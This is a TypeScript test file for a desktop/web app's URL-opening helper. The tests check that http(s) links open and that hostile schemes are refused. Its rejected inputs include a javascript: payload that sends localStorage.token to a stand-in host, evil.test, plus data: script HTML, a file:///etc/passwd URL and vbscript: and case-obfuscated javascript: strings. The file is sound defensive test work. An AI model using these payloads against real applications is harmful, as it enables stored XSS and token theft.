/**
 * Tests for src/lib/open-external.ts — the one place every "open this in the
 * user's browser" click funnels through.
 *
 * The URLs it is handed are NOT trustworthy. `external_url` on a link row is
 * built from the workspace's stored `site_url` (jira-push's issueBrowseUrl) and
 * the compose panel's native-create deep link is built the same way, so a
 * hostile value written into `task_sync_state.config` by one workspace admin is
 * clicked by OTHER members. `javascript:` in a `window.open` runs in the app's
 * own origin — stored XSS — and on desktop the Tauri opener hands whatever it
 * gets to the OS, where a `file:` or a custom scheme is a launcher.
 *
 * So this helper is the last line of a three-layer defence (PATCH validation,
 * parseJiraConfig degradation, and here), and it is the only layer that covers
 * callers that never touch Jira at all.
 */
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import {
  keepsSystemBrowser,
  openExternalUrl,
  openInSystemBrowser,
} from '@/lib/open-external'

const openUrlMock = vi.fn(async () => {})
vi.mock('@tauri-apps/plugin-opener', () => ({ openUrl: openUrlMock }))

let windowOpen: ReturnType<typeof vi.fn>
let warn: ReturnType<typeof vi.spyOn>

beforeEach(() => {
  openUrlMock.mockClear()
  windowOpen = vi.fn()
  vi.stubGlobal('window', { open: windowOpen } as unknown as Window)
  warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
})

afterEach(() => {
  vi.unstubAllGlobals()
  warn.mockRestore()
})

/** Mark the current `window` as the desktop shell so the Tauri leg is taken. */
function asDesktop() {
  ;(window as unknown as { __TAURI__?: unknown }).__TAURI__ = {}
}

describe('openExternalUrl — accepted schemes', () => {
  it('opens an http(s) url in a new tab on the web', async () => {
    await openExternalUrl('https://acme.atlassian.net/browse/ENG-42')
    expect(windowOpen).toHaveBeenCalledWith(
      'https://acme.atlassian.net/browse/ENG-42',
      '_blank',
      'noopener,noreferrer',
    )
  })

  it('hands an http(s) url to the OS opener on desktop', async () => {
    asDesktop()
    await openExternalUrl('http://localhost:3000/browse/ENG-42')
    expect(openUrlMock).toHaveBeenCalledWith('http://localhost:3000/browse/ENG-42')
    expect(windowOpen).not.toHaveBeenCalled()
  })
})

describe('openExternalUrl — rejected schemes', () => {
  it('refuses a javascript: url on the web instead of executing it', async () => {
    await openExternalUrl('javascript:fetch("https://evil.test?t="+localStorage.token)')
    expect(windowOpen).not.toHaveBeenCalled()
  })

  it('refuses a javascript: url on desktop instead of handing it to the OS', async () => {
    asDesktop()
    await openExternalUrl('javascript:alert(1)')
    expect(openUrlMock).not.toHaveBeenCalled()
    expect(windowOpen).not.toHaveBeenCalled()
  })

  it.each([
    ['data:text/html,<script>alert(1)</script>'],
    ['file:///etc/passwd'],
    ['vbscript:msgbox(1)'],
    ['  javascript:alert(1)'],
    ['JaVaScRiPt:alert(1)'],
  ])('refuses %s', async (url) => {
    asDesktop()
    await openExternalUrl(url)
    expect(openUrlMock).not.toHaveBeenCalled()
    expect(windowOpen).not.toHaveBeenCalled()
  })

  it('refuses a value that is not a parseable absolute url', async () => {
    await openExternalUrl('/browse/ENG-42')
    expect(windowOpen).not.toHaveBeenCalled()
  })

  it('falls back to window.open only for an ACCEPTED url when the opener throws', async () => {
    asDesktop()
    openUrlMock.mockRejectedValueOnce(new Error('no opener'))
    await openExternalUrl('https://acme.atlassian.net/browse/ENG-42')
    expect(windowOpen).toHaveBeenCalledWith(
      'https://acme.atlassian.net/browse/ENG-42',
      '_blank',
      'noopener,noreferrer',
    )
  })
})

describe('openExternalUrl — the desktop', () => {
  it('hands every link to the OS browser: there is no in-app browser any more (docs/plans/cloud-browser.md, C5)', async () => {
    asDesktop()
    await openExternalUrl('https://github.com/acme/app/pull/7', { background: true })
    await openInSystemBrowser('javascript:alert(1)')
    expect(openUrlMock.mock.calls).toEqual([['https://github.com/acme/app/pull/7']])
  })
})

describe('keepsSystemBrowser', () => {
  it.each([
    'https://accounts.google.com/signin',
    'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=x',
    'https://appleid.apple.com/auth/authorize',
    'https://github.com/login/oauth/authorize?client_id=x',
    'https://github.com/login',
    'https://app.hubspot.com/oauth/authorize?client_id=x',
    'https://slack.com/oauth/v2/authorize?client_id=x',
    'https://auth.example.com/connect?client_id=x&response_type=code',
    'https://example.com/anything?redirect_uri=https%3A%2F%2Fdial8.ai',
    'https://example.com/anything?redirect_uri=https%3A%2F%2Fnativeintelligence.dev',
    'https://acme.okta.com/sso/saml',
    'https://checkout.stripe.com/c/pay/cs_live_1',
    'https://billing.stripe.com/p/session/1',
    'https://meet.google.com/abc-defg-hij',
    'https://zoom.us/j/123',
    'https://acme.zoom.us/j/123?pwd=x',
    'https://acme.webex.com/meet/jane',
    'https://teams.microsoft.com/l/meetup-join/19%3ameeting_x',
    'https://teams.live.com/meet/9381',
    'https://invoice.stripe.com/i/acct_1/test',
    'https://connect.stripe.com/setup/s/acct_1',
    'https://acme.zoomgov.com/j/1',
    'https://global.gotomeeting.com/join/123',
    'https://meet.goto.com/123',
    'https://app.chime.aws/meetings/123',
    'https://whereby.com/acme',
    'https://meet.jit.si/acme',
    'https://app.slack.com/huddle/T1/C1',
    // Native Intelligence's own pages: the app routes them, or they open as before.
    'https://nativeintelligence.dev/invite/abc',
    'https://www.nativeintelligence.dev/pricing',
    'https://app.nativeintelligence.dev/account',
    // …and on the address it had before the rename, which still serves.
    'https://dial8.ai/invite/abc',
    'https://app.dial8.ai/account',
    // Wrapped links are judged by the link inside.
    'https://eur01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fteams.microsoft.com%2Fl%2Fmeetup-join%2F19%253ameeting&data=x',
    'https://nam02.safelinks.protection.outlook.com/?url=https%3A%2F%2Faccounts.google.com%2Fsignin&data=x',
    'https://www.google.com/url?q=https://acme.zoom.us/j/123&sa=D',
    'https://urldefense.com/v3/__https://acme.zoom.us/j/123__;!!abc$',
    'https://urldefense.proofpoint.com/v2/url?u=https-3A__checkout.stripe.com_c_pay&d=x',
  ])('keeps %s in the user\'s browser', (url) => {
    expect(keepsSystemBrowser(url)).toBe(true)
  })

  it.each([
    'https://github.com/acme/app/pull/7',
    'https://www.linkedin.com/in/jane',
    'https://acme.atlassian.net/browse/ENG-42',
    'https://teams.microsoft.com/v2/',
    'https://docs.google.com/document/d/1/edit',
    'https://stripe.com/pricing',
    'https://example.com/authors/jane',
    'https://app.slack.com/client/T1/C1',
    'https://notdial8.ai/',
    'https://notnativeintelligence.dev/',
    'https://nativeintelligence.dev.evil.example/',
    'https://dial8.ai.evil.example/',
    'https://eur01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fgithub.com%2Facme%2Fapp&data=x',
    'https://www.google.com/url?q=https://example.com/',
    'https://www.google.com/search?q=https://accounts.google.com',
    'not a url',
  ])('lets %s open in the in-app browser', (url) => {
    expect(keepsSystemBrowser(url)).toBe(false)
  })
})
